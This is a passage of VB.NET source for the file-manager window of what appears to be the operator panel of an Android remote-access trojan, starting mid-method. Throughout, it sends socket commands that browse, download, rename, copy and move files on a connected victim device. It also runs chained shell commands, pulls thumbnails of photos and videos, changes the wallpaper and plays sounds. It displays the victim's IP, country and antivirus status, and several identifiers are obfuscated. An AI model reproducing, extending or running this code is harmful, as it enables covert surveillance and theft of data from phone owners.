                            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & old & sockets.Data.SPL_DATA & neew, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                            classClient.SendAsync(objs)
                        End If
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub ShowToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then
                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    If name.Trim.Chars(0) = "."c Then
                        Dim formatName As String = Nothing
                        Dim status As Boolean
                        For c As Integer = 0 To name.Length - 1
                            If Not name.Trim.Chars(c) = "."c Then
                                formatName &= name.Trim.Chars(c)
                                status = True
                            Else
                                If status Then
                                    formatName &= name.Trim.Chars(c)
                                End If
                            End If
                        Next
                        status = False
                        Dim neew As String = DGV0.Tag & "/" & formatName
                        Dim old As String = DGV0.Tag & "/" & name
                        If Not classClient Is Nothing Then
                            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & old & sockets.Data.SPL_DATA & neew, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                            classClient.SendAsync(objs)
                        End If
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub AddFilesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AddFilesToolStripMenuItem.Click
        If Not classClient Is Nothing Then
            Dim pd As New Frm_inp
            pd.Text = "Add Files"
            pd.LTitle.Text = "New name"
            pd.StartPosition = FormStartPosition.Manual
            pd.Location = Frm_Config_Codes.FixSize(Me, pd)
            pd.BOXX.Visible = True
            Select Case pd.ShowDialog(Me)
                Case DialogResult.OK
                    If Not classClient Is Nothing Then
                        Dim isFolde As Boolean = pd.CheckFolder.Checked
                        Dim isHidden As Boolean = pd.CheckHidden.Checked
                        Dim name As String = pd.InputText.Text
                        If isHidden = True Then
                            name = "." & name
                        End If
                        Dim path As String = DGV0.Tag & "/" & name
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "create" & sockets.Data.SPL_DATA & path & sockets.Data.SPL_DATA & CStr(isFolde), Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
            End Select
            pd.Close()
        End If
    End Sub
    Private Sub OpenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    If Not classClient Is Nothing Then
                        Dim fromExtension As String = "null"
                        If p.Contains(".") And Not p.EndsWith(".") Then
                            fromExtension = p.Substring(p.LastIndexOf(".") + 1)
                        End If
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "open" & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & fromExtension, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
                End If
            Next
        End If
    End Sub
    Private Function ISupportedText(ByVal t As String) As Boolean '//Supported Text
        If t.Contains(".") Then
            Dim ext As String = """" & t.Substring(t.LastIndexOf(".")) & """"
            If Frm_Config_Settings.SupportedText.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
    Private Function ISupportedImages(ByVal t As String) As Boolean '//Supported Images
        If t.Contains(".") Then
            Dim ext As String = """" & t.Substring(t.LastIndexOf(".")) & """"
            If Frm_Config_Settings.SupportedImages.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
    Private Function ISupportedVideo(ByVal t As String) As Boolean '//Supported Video
        If t.Contains(".") Then
            Dim ext As String = """" & t.Substring(t.LastIndexOf(".")) & """"
            If Frm_Config_Settings.SupportedVideo.Contains(ext) Then
                Return True
            Else
                Return False
            End If
        Else
            Return False
        End If
        Return False
    End Function
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
    Private Sub BoxTitle_Paint(sender As Object, e As PaintEventArgs) Handles BoxTitle.Paint
        Try
            If BoxTitlePaintEventArgsWait Then
                Dim CountThums As String = Me.classClient.FolderUSER & "\Thumbs" & Me.DGV0.Tag.Replace("/", "\")
                Dim countar As Integer = 0
                If Directory.Exists(CountThums) Then
                    countar = Directory.GetFiles(CountThums, "*.*").Count
                End If
                Dim DGV0Count As Integer = DGV0.Rows.Count - 1
                Dim _DGV0Count As String = "All " & CStr(DGV0Count)
                Dim CountClipboard As Integer = Clipboard.Count
                Dim _DGV0_SEL As String = "Selected " & CStr(DGV0.SelectedRows.Count) & Space(10) & "Seen " & countar.ToString() & If(CountClipboard > 0, Space(10) & "Clipboard " & CStr(Clipboard.Count), "")
                Dim clr As Color = Color.Black
                e.Graphics.DrawLine(New Pen(Color.Black), 0, 1, BoxTitle.Width, 1)
                Dim ColorFont As Brush
                ColorFont = New SolidBrush(Color.DarkTurquoise)
                Dim ColorBack As Brush = New SolidBrush(Color.FromArgb(45, 45, 45))
                Dim TextRender0 As Size = TextRenderer.MeasureText(_DGV0Count & Space(10) & _DGV0_SEL, Frm_Config_Settings.f)
                Dim rect0 As New Rectangle(0, 2, BoxTitle.Width, TextRender0.Height + 10)
                e.Graphics.FillRectangle(New Pen(ColorBack).Brush, rect0)
                e.Graphics.DrawString(_DGV0Count & Space(10) & _DGV0_SEL & Space(10), Frm_Config_Settings.f, ColorFont, 0, 2)
                Dim MeSize As Size = TextRenderer.MeasureText("S", Frm_Config_Settings.f)
                BoxTitle.Height = MeSize.Height + 5
            End If
        Catch ex As Exception

        End Try
    End Sub
    Private Sub AngelAndroidForm_Activated(sender As Object, e As EventArgs) Handles Me.Activated
        BoxTitle.Invalidate()
    End Sub
    Private Sub AngelAndroidForm_Deactivate(sender As Object, e As EventArgs) Handles Me.Deactivate
        BoxTitle.Invalidate()
    End Sub
    Private Sub BoxTitle_Resize(sender As Object, e As EventArgs) Handles BoxTitle.Resize
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_RowsRemoved(sender As Object, e As DataGridViewRowsRemovedEventArgs) Handles DGV0.RowsRemoved
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_RowsAdded(sender As Object, e As DataGridViewRowsAddedEventArgs) Handles DGV0.RowsAdded
        BoxTitle.Invalidate()
    End Sub
    Private Sub DGV0_SelectionChanged(sender As Object, e As EventArgs) Handles DGV0.SelectionChanged
        BoxTitle.Invalidate()
        If DGV0.SelectedRows.Count = 1 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim flag As Boolean = False
                    FileDirectory = Me.classClient.FolderUSER & "\Thumbs" & Me.DGV0.Tag.Replace("/", "\")
                    If (p.Substring(p.LastIndexOf("/") + 1)).EndsWith(".mp4") Then
                        Dim name As String = p.Substring(p.LastIndexOf("/") + 1)
                        If thumb_chk.Checked Then
                            If Directory.Exists(FileDirectory + "\" + name.Replace(".mp4", "")) Then
                                For Each file As String In My.Computer.FileSystem.GetFiles(FileDirectory + "\" + name.Replace(".mp4", ""))
                                    Dim information = My.Computer.FileSystem.GetFileInfo(file)
                                    viwimage.Image = Image.FromFile(FileDirectory + "\" + name.Replace(".mp4", "") + "\" + information.Name)
                                    viwimage.Visible = True
                                    flag = True
                                    Exit For
                                Next
                            End If
                        End If
                    End If
                    If flag Then
                        Return
                    End If
                    If thumb_chk.Checked AndAlso Directory.Exists(FileDirectory) Then
                        If File.Exists(FileDirectory + "\" + p.Substring(p.LastIndexOf("/") + 1)) Then
                            viwimage.Image = Image.FromFile(FileDirectory + "\" + p.Substring(p.LastIndexOf("/") + 1))
                            viwimage.Visible = True
                            flag = True
                        End If
                    End If
                    If flag Then
                        Return
                    End If
                    Dim t As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim status As Object = "null"
                    If ISupportedImages(t.ToLower) Then
                        status = "false"
                    ElseIf ISupportedVideo(t.ToLower) Then
                        status = "true"
                    Else
                        status = "null"
                    End If
                    If Not status = "null" Then
                        If Not classClient Is Nothing Then
                            Dim spl As String() = classClient.Keys.Split(":")
                            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "small" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & status & sockets.Data.SPL_DATA & Q & sockets.Data.SPL_DATA & Authentication_users.aVnydnannovCiwfayBayMfzeuVNxvyVzmByxyMmNafnVibbadc, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                            classClient.SendAsync(objs)
                        End If
                    End If
                Else
                    viwimage.Image = Nothing
                End If
            Next
        End If
    End Sub
    Private Clipboard As New List(Of Array)
    Private Sub Sub_Clipboard(ByVal pram As String)
        If pram = "'PASTE'" And Clipboard.Count > 0 Then
            Dim p As String = Format_Space(DGV0.Tag)
            Dim commend As String = ""
            For Each i In Clipboard
                Dim ar As Array = i
                If Not commend.Length = 0 Then
                    commend &= Space(1) & "&&" & Space(1) & ar(3) & Space(1) & ar(2) & Space(1) & p
                Else
                    commend &= ar(3) & Space(1) & ar(2) & Space(1) & p
                End If
            Next
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "commend" & sockets.Data.SPL_DATA & commend, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
            Clipboard.Clear()
        Else
            Clipboard.Clear()
            If DGV0.SelectedRows.Count > 0 Then
                For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                    Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                    If Not tg = "back" Then
                        Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                        Dim isFile As Boolean = False
                        If tg = "1" Then
                            isFile = True
                        Else
                            isFile = False
                        End If
                        If pram = "'COPY'" Then
                            If isFile Then
                                Clipboard.Add({pram, isFile, Format_Space(p), "cp"})
                            Else
                                Clipboard.Add({pram, isFile, Format_Space(p), "cp -R"})
                            End If
                        Else
                            Clipboard.Add({pram, isFile, Format_Space(p), "mv"})
                        End If
                    End If
                Next
            End If
        End If
    End Sub
    Private Function Format_Space(ByVal prm As String) As String
        If prm.Contains(Space(1)) Then
            prm = prm.Replace(Space(1), "(U+0020)".ToLower)
        End If
        Return prm
    End Function
    Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CutToolStripMenuItem.Click
        Sub_Clipboard("'CUT'")
        BoxTitle.Invalidate()
    End Sub
    Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyToolStripMenuItem.Click
        Sub_Clipboard("'COPY'")
        BoxTitle.Invalidate()
    End Sub
    Private Sub PasteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasteToolStripMenuItem.Click
        If Not Clipboard.Count = 0 Then
            Sub_Clipboard("'PASTE'")
        End If
        BoxTitle.Invalidate()
    End Sub
    Private Sub SetWallpaperToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SetWallpaperToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then
                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim path As String = DGV0.Tag & "/" & name
                    If Not classClient Is Nothing Then
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "set_wallpaper" & sockets.Data.SPL_DATA & path, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub PlaySoundToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PlaySoundToolStripMenuItem.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                If Not DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag = "back" Then
                    Dim name As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    Dim path As String = DGV0.Tag & "/" & name
                    If Not classClient Is Nothing Then
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "play_back" & sockets.Data.SPL_DATA & path, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub ctxMenu_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ctxMenu.Opening
        Select Case ver
            Case "v1.0"
                SetWallpaperToolStripMenuItem.Visible = False
            Case Else
                SetWallpaperToolStripMenuItem.Visible = True
        End Select
    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        If Not classClient Is Nothing Then
            Dim obj As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & Pback(DGV0.Tag), Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(obj)
        End If
    End Sub
    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & DGV0.Tag, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub FileManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        If DGVDATA.Rows.Count > 0 Then
            For Each ro As DataGridViewRow In DGVDATA.Rows
                If ro.Tag.ToString.Length > 1 Then
                    If Not MessageBox.Show("Cancel Running Downloads?", "File Manager", MessageBoxButtons.YesNo) = DialogResult.Yes Then
                        e.Cancel = True
                        Return
                    End If
                End If
            Next
        End If
        Timer1.Stop()
        Correntindex = 1
        For index = 1 To Me.DownStreams.Count
            Try
                If Not Me.DownStreams.Item(index) Is Nothing Then
                    Dim mydata = Me.DownStreams.Item(index)
                    Dim FSTREAM As FileStream = DirectCast(mydata(0), FileStream)
                    Dim FSSIZE As Long = CType(mydata(1), Long)
                    If FSTREAM IsNot Nothing Then
                        FSTREAM.Dispose()
                        FSTREAM.Close()
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Private Sub Pathtxt_SizeChanged(sender As Object, e As EventArgs) Handles pathtxt.SizeChanged
        Me.PB.Size = Me.pathtxt.Size
    End Sub
    Dim isfront As Boolean = False
    Dim KEYsx As String
    Dim tempImage As New PictureBox
    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles RotateButton.Click
        If Not viwimage.Image Is Nothing Then
            Dim Bmap = New Bitmap(viwimage.Image)
            Bmap.RotateFlip(RotateFlipType.Rotate90FlipNone)
            viwimage.Image = Bmap
        End If
    End Sub
    Private Sub Button10_Click(sender As Object, e As EventArgs) Handles DownloadButton.Click
        If DGV0.SelectedRows.Count > 0 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    If Not classClient Is Nothing Then
                        Dim spl As String() = classClient.Keys.Split(":")
                        Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "download" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & Authentication_users.ywCvCBbcutvoVCrvnauyzBgqvgbfurMbMbgodCbuuVvoyivpVe & sockets.Data.SPL_DATA & Authentication_users.oyuwnvpwvzByfconytvywdibuxxBoeouxuvpCzcoBsnNfcixvy & sockets.Data.SPL_DATA & classClient.UUID, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objs)
                    End If
                End If
            Next
        End If
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles UserButton.Click

    End Sub
    Private Sub VScrollBar1_Scroll(sender As Object, e As ScrollEventArgs)
        Try
            DGV0.FirstDisplayedScrollingRowIndex = e.NewValue
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Sdcardbutton_Click(sender As Object, e As EventArgs) Handles sdcardbutton.Click
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub Dcimbutton_Click(sender As Object, e As EventArgs) Handles dcimbutton.Click
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get3", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub Button1_Click_1(sender As Object, e As EventArgs) Handles Button1.Click
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get2", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
        End If
    End Sub
    Private Sub Panel3_Resize(sender As Object, e As EventArgs) Handles Panel3.Resize
        If Me.Panel3.Height > 506 Then
            Me.viwimage.MaximumSize = New Size(187, Me.Panel3.Height - 215)
        End If
    End Sub
    Private Sub LoadVideo()
        If DGV0.SelectedRows.Count = 1 Then
            For i As Integer = DGV0.SelectedRows.Count - 1 To 0 Step -1
                Dim tg As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(0).Tag
                If tg = "1" Then
                    Dim p As String = DGV0.Tag & "/" & DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                    FileDirectory = Me.classClient.FolderUSER & "\Thumbs" & Me.DGV0.Tag.Replace("/", "\")
                    If (p.Substring(p.LastIndexOf("/") + 1)).EndsWith(".mp4") Then
                        ShowVideo = True
                        thumb_chk.Checked = False
                        thumb_chk.Refresh()
                        Dim t As String = DGV0.Rows(DGV0.SelectedRows(i).Index).Cells(1).Value
                        Dim status As Object = "null"
                        If ISupportedImages(t.ToLower) Then
                            status = "false"
                        ElseIf ISupportedVideo(t.ToLower) Then
                            status = "true"
                        Else
                            status = "null"
                        End If
                        If Not status = "null" Then
                            If Not classClient Is Nothing Then
                                Dim spl As String() = classClient.Keys.Split(":")
                                Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "small" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & p & sockets.Data.SPL_DATA & status & sockets.Data.SPL_DATA & Q & sockets.Data.SPL_DATA & Authentication_users.aVnydnannovCiwfayBayMfzeuVNxvyVzmByxyMmNafnVibbadc, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                                classClient.SendAsync(objs)
                             End If
                         End If
                     End If
                 Else
                    viwimage.Image = Nothing
                End If
             Next
         End If
     End Sub
     Private Sub Viwimage_MouseUp(sender As Object, e As MouseEventArgs)
      End Sub
     Private Sub Viwimage_MouseLeave(sender As Object, e As EventArgs)
        ShowVideo = False
        thumb_chk.Checked = True
        thumb_chk.Refresh()
    End Sub
     Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            If Me.classClient IsNot Nothing Then
                If Downpic.Tag = "on" Then
                Else
                    If Me.classClient.isconnected Then
                        If classClient.isready Then
                            Me.ClientPic.Image = DirectCast(classClient.Wallpaper(0), Image)
                            Me.Cliflag.Image = classClient.Flag
                            Me.usrscreen.Image = Me.classClient.Screen
                            Me.Usrbtry.Image = classClient.Battery
                            Me.usrnetwork.Image = classClient.Wifi
                        End If
                    Else
                        Me.ClientPic.Image = My.Resources.disconnected
                    End If
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub
     Private Sub Viwimage_MouseDown_1(sender As Object, e As MouseEventArgs) Handles viwimage.MouseDown
        LoadVideo()
    End Sub
     Private Sub Viwimage_MouseUp_1(sender As Object, e As MouseEventArgs) Handles viwimage.MouseUp
        ShowVideo = False
        thumb_chk.Checked = True
        thumb_chk.Refresh()
    End Sub
     Private Sub ClearButton_Click(sender As Object, e As EventArgs) Handles ClearButton.Click
        If DGVDATA.Rows.Count > 0 Then
             For Each Ro As DataGridViewRow In DGVDATA.Rows
                Try
                    If Ro.Tag = "f" Or Ro.Tag = "x" Or Ro.Tag = "X" Then
                         DGVDATA.Rows.RemoveAt(Ro.Index)
                        Downpic.BadgeText = DGVDATA.Rows.Count.ToString
                    End If
                Catch ex As Exception
                 End Try
            Next
         End If
    End Sub
     Private Sub Button2_Click(sender As Object, e As EventArgs) Handles cancelbtn.Click
        Try
            If DGVDATA.SelectedRows.Count > 0 Then
                For Each roo As DataGridViewRow In DGVDATA.SelectedRows
                    If roo.Tag.ToString.Length > 1 Then
                        roo.Tag = "X"
                        roo.Cells(4).Value = "Cancelled.."
                        roo.DefaultCellStyle.ForeColor = Color.Green
                    End If
                Next
            End If
        Catch ex As Exception

        End Try
    End Sub
     Private Sub Usrbtry_MouseEnter(sender As Object, e As EventArgs) Handles Usrbtry.MouseEnter
        Try
            Dim TipText As String = "%" & classClient.BatteryCharge
            ToolTip1.Show(TipText, Usrbtry, 1000)
        Catch ex As Exception

        End Try
    End Sub
     Private Sub ClientPic_MouseEnter(sender As Object, e As EventArgs) Handles ClientPic.MouseEnter
        Try
            Dim TipText As String = "User-INFO" & vbNewLine _
                             & "Name:" & classClient.ClientName & vbNewLine _
                             & "Defender:" & classClient.ClientDefender & vbNewLine _
                             & "From:" & classClient.Country & vbNewLine _
                             & "ip:" & classClient.ClientAddressIP
            ToolTip1.Show(TipText, ClientPic, 2000)
        Catch ex As Exception

        End Try
    End Sub
     Private Sub Usrnetwork_MouseEnter(sender As Object, e As EventArgs) Handles usrnetwork.MouseEnter
        Try
            Dim TipText As String = classClient.Statistics
            ToolTip1.Show(TipText, usrnetwork, 1000)
        Catch ex As Exception

        End Try
    End Sub
     Private Sub DGV0_Scroll(sender As Object, e As ScrollEventArgs) Handles DGV0.Scroll
        Try
            VRBAR.Value = e.NewValue
        Catch ex As Exception
         End Try
    End Sub
     Private Sub DGV0_MouseWheel(sender As Object, e As MouseEventArgs) Handles DGV0.MouseWheel
         Try
            Dim currentIndex As Integer = Me.DGV0.FirstDisplayedScrollingRowIndex
            Dim scrollLines As Integer = SystemInformation.MouseWheelScrollLines
             If e.Delta > 0 Then
                Me.DGV0.FirstDisplayedScrollingRowIndex = Math.Max(0, currentIndex - scrollLines)
            ElseIf e.Delta < 0 Then
                Me.DGV0.FirstDisplayedScrollingRowIndex = currentIndex + scrollLines
            End If
        Catch ex As Exception
         End Try
    End Sub
     Private Sub MetroSetBadge1_Click(sender As Object, e As EventArgs) Handles Downpic.Click
        If Downpic.Tag.ToString = "off" Then
            Downpic.Tag = "on"
            ClearButton.Enabled = True
            ClearButton.Visible = True
            cancelbtn.Enabled = True
            cancelbtn.Visible = True
             DGVDATA.BringToFront()
        Else
            Downpic.Tag = "off"
            ClearButton.Enabled = False
            ClearButton.Visible = False
            cancelbtn.Enabled = False
            cancelbtn.Visible = False
             DGVDATA.SendToBack()
        End If
    End Sub
     Private Sub VRBAR_Scroll_1(sender As Object, e As ScrollEventArgs) Handles VRBAR.Scroll
        Try
            DGV0.FirstDisplayedScrollingRowIndex = e.NewValue
        Catch ex As Exception
         End Try
    End Sub

    Private Sub DGVDATA_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGVDATA.CellContentClick

    End Sub

    Private Sub Panel2_Paint(sender As Object, e As PaintEventArgs) Handles Panel2.Paint

    End Sub

    Private Sub FilesDownloadedToolStripMenuItem_Click(sender As Object, e As EventArgs)
        If Not classClient Is Nothing Then
            Dim down As String = classClient.FolderUSER & "\Downloads"
            If Not IO.Directory.Exists(down) Then
                IO.Directory.CreateDirectory(down)
            End If
            Process.Start(down)
        End If
    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Me.Close()
    End Sub

    Private Sub DGV0_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGV0.CellContentClick

    End Sub
End Class